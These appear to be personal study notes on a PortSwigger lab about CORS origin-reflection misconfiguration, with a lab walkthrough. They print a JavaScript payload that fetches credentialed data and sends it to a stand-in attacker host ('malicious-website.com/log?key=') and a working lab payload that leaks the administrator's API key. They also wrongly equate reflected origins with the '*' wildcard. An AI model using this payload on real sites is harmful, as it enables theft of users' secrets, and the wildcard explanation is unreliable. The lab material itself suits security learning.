Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

## Server-generated [ACAO](https://portswigger.net/web-security/cors/access-control-allow-origin) header from client-specified Origin header

   - Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.
   - One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.

**For example, consider an application that receives the following request:**
```js
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```

**It then responds with:**
```js
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true 
...
```
   - These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.
   - Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain.
	   - In the context of Cross-Origin Resource Sharing (CORS), "arbitrary origins" refer to any domains or origins that are not explicitly listed as allowed origins by a server's CORS policy.
	   - When a server allows access from "arbitrary origins," it typically means that it's configured to accept requests from any domain, regardless of whether the domain is listed in the CORS policy or not.
	 This is achieved by using a wildcard `*` in the "Access-Control-Allow-Origin" response header. For example:
```js
Access-Control-Allow-Origin: *
```

**If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:**
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
	};
```

## Steps to solve lab
### Title - CORS vulnerability with basic origin reflection

**Desc** - This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

**Creds** - You can log in to your own account using the following credentials: `wiener:peter`


1. Try to find any CORS related headers in the application.
![[cors11.png]]
We got a end-point("/accountDetails"), which is most likely vulnerable. Let's test for it.

2. To test for CORS misconfiguration:
	1. We try to change the value of origin header to an arbitrary value.
	   **Before adding the Origin header** - 
	   ![[cors12.png]]
	   
	   **After adding the Origin header** - 
	   ![[cors13.png]]
The web application just reflects our origin value in the "Access-Control-Allow-Origin: " header.

3. Copy the below payload and paste it into the exploit server.
**Payload** - 
```js
<script>
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a0200a50335a10b81bf1cbc005f000e.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 

function reqListener() { 
	location='/log?key='+this.responseText; 
	};
</script>
```

![[cors14.png]]

4. Now, view the "Access log" for any get request sent by "administrator" browser.
![[cors15.png]]
As you can see above, we got a get request in the Access log of exploit-server.

5. After successfully decoding it, we got "api" key.
![[cors16.png]]

submit the api key and lab will be solved.


For better understanding watch --> [[CORS_Lab_1_CORS vulnerability with basic origin reflection _ Long Video.mp4]]

#### Payload code explaination
1. `var req = new XMLHttpRequest();`: This line creates a new XMLHttpRequest object. An XMLHttpRequest object is used to make HTTP requests from the browser to a server and retrieve data without having to refresh the entire webpage.
    
2. `req.onload = reqListener;`: It sets the `onload` event handler for the XMLHttpRequest object. This means that when the request is completed successfully (i.e., when the response is received), the `reqListener` function will be called to handle the response.
    
3. `req.open('get', 'https://0a7200e204111410805fc68500a500ed.web-security-academy.net/accountDetails', true);`: This line configures the XMLHttpRequest to make a GET request to the specified URL, which is `'https://0a7200e204111410805fc68500a500ed.web-security-academy.net/accountDetails'`. The `true` argument in the `open` method indicates that the request should be asynchronous.
    
4. `req.withCredentials = true;`: This line sets the `withCredentials` property to `true`, which means that any credentials associated with the current webpage (such as cookies) will be included with the request.
    
5. `req.send();`: This line sends the HTTP GET request to the specified URL.
    
6. The `reqListener` function is defined to handle the response. When the request is complete, this function is executed. It changes the location (URL) of the current webpage to `'/log?key=' + this.responseText`. This effectively redirects the user to a new URL, passing the response text as a query parameter.

In summary, this code makes an HTTP request to the specified URL, and upon receiving a response, it redirects the user to a new location.